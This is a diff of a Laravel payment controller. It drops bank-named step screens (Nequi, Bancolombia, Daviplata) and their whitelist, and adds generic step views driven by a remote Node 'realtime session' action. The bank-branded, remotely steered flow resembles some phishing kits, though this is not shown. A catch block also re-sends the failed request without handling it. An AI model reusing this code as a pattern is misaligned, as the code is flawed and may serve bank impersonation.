@@ -3,67 +3,124 @@
 namespace App\Http\Controllers;
 
 use Illuminate\Http\Request;
-use Illuminate\Support\Str;
-
+use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Facades\View;
-
+use Illuminate\Support\Arr;
+use GuzzleHttp\Promise\PromiseInterface;
 
 class PaymentController extends Controller
 {
-    // Bancos permitidos (whitelist)
-    private array $banks = [
-        'nequi',
-        'bancolombia',
-        'daviplata',
-    ];
-
-    // Pantallas permitidas
-    private array $screens = [
-        'step1',
-        'step2',
-        'step3',
-        'step4',
-    ];
-
-       public function index(string $bank, Request $request)
+    public function index(Request $request)
     {
-        //$cfg = config("banks.$bank");
-
-        // Si el banco no existe, manda a una vista genérica o 404
-        //abort_if(!$cfg, 404);
-
-        //$view = $cfg['view_prefix'] . '.index';
-        //abort_if(!View::exists($view), 404);
-        $view = "banks.$bank.step1";
+        $view = "layouts.step1";
         abort_if(!View::exists($view), 404);
-
-        return view(view: $view);
+        return view($view);
     }
 
-
-    public function screen(Request $request, string $bank, ?string $screen = 'step1')
+    // ✅ Render step2 asegurando RT igual que bank
+    public function step2(Request $request)
     {
-        // Normaliza por si llega "Nequi" o espacios raros
-        $bank = Str::of($bank)->lower()->trim()->toString();
-        $screen = Str::of($screen ?? 'step1')->lower()->trim()->toString();
+        // maxSteps no aplica acá; pero usamos 2 solo para consistencia mental
+        $this->ensureRealtimeSessionGeneral($request);
 
-        // Seguridad: evitar path traversal / vistas arbitrarias
-        if (!in_array($bank, $this->banks, true))
-            abort(code: 404);
-        if (!in_array($screen, $this->screens, true))
-            abort(404);
+        $sc = (array) $request->session()->get('sc', []);
 
-        // Busca: resources/views/pago/{bank}/{screen}.blade.php
-        $view = "banks.$bank.$screen";
-        if (!view()->exists($view))
-            abort(404);
-        
+        $view = "layouts.step2";
+        abort_if(!View::exists($view), 404);
+
         return view($view, [
-            'bank' => $bank,
-            'screen' => $screen,
-            'sessionId' => $request->session()->get('rt_session_id'),
-            'sessionToken' => $request->session()->get('rt_session_token'),
             'nodeUrl' => env('NODE_BACKEND_URL', 'http://localhost:3005'),
+            'sessionId' => Arr::get($sc, 'rt_session_id'),
+            'sessionToken' => Arr::get($sc, 'rt_session_token'),
         ]);
+    }
+
+    // ✅ Endpoint JSON opcional (si lo sigues usando con fetch)
+    public function initAuth(Request $request)
+    {
+        $this->ensureRealtimeSessionGeneral($request);
+
+        $sc = (array) $request->session()->get('sc', []);
+
+        return response()->json([
+            'ok' => true,
+            'nodeUrl' => env('NODE_BACKEND_URL', 'http://localhost:3005'),
+            'sessionId' => Arr::get($sc, 'rt_session_id'),
+            'sessionToken' => Arr::get($sc, 'rt_session_token'),
+        ]);
+    }
+
+    // ======= PRIVATE =======
+    private function ensureRealtimeSessionGeneral(Request $request): void
+    {
+        $sc = (array) $request->session()->get('sc', []);
+        $baseUrl = rtrim(env('NODE_BACKEND_URL', 'http://localhost:3005'), '/');
+
+        // En flujo general no hay bank, pero sí queremos action base:
+        $sc['bank'] = $sc['bank'] ?? '';         // general
+        $sc['action'] = $sc['action'] ?? 'DATA';  // tu nuevo flujo
+
+        // 1) Ya existe sessionId => NO crear otra
+        if (!empty($sc['rt_session_id'])) {
+
+            // 1.1 token si falta
+            if (empty($sc['rt_session_token'])) {
+                try {
+                    $url = $baseUrl . '/api/sessions/';
+                    $resp = Http::asJson()->timeout(10)->post($url);
+
+                    if ($resp instanceof PromiseInterface) $resp = $resp->wait();
+
+                    if ($resp->successful()) {
+                        $sc['rt_session_token'] = $resp->json('sessionToken');
+                        $request->session()->put('sc', $sc);
+                        $request->session()->save();
+                    }
+                } catch (\Throwable $e) {
+                    $resp = Http::asJson()->timeout(10)->post($url);
+                }
+            }
+
+            // 1.2 opcional: sync action (si quieres)
+            // (si tu API requiere token para GET, usa withToken; si no, déjalo simple)
+            if (!empty($sc['rt_session_token'])) {
+                try {
+                    $url = $baseUrl . '/api/sessions/' . $sc['rt_session_id'];
+                    $resp = Http::withToken($sc['rt_session_token'])->timeout(10)->get($url);
+
+                    if ($resp instanceof PromiseInterface) $resp = $resp->wait();
+
+                    if ($resp->successful()) {
+                        $nodeAction = $resp->json('session.action') ?? $resp->json('action');
+                        if ($nodeAction) {
+                            $sc['action'] = $nodeAction;
+                            $request->session()->put('sc', $sc);
+                            $request->session()->save();
+                        }
+                    }
+                } catch (\Throwable $e) {}
+            }
+
+            return;
+        }
+
+        // 2) No hay sessionId => crear sesión realtime en Node
+        try {
+            $url = $baseUrl . '/api/sessions';
+            $resp = Http::asJson()->timeout(10)->post($url, $sc);
+
+            if ($resp instanceof PromiseInterface) $resp = $resp->wait();
+
+            if ($resp->successful()) {
+                $sc['rt_session_id'] = $resp->json('sessionId');
+                $sc['rt_session_token'] = $resp->json('sessionToken');
+
+                $nodeAction = $resp->json('session.action') ?? $resp->json('action');
+                if ($nodeAction) $sc['action'] = $nodeAction;
+
+                $request->session()->put('sc', $sc);
+                $request->session()->save();
+            }
+        } catch (\Throwable $e) {}
     }
 }
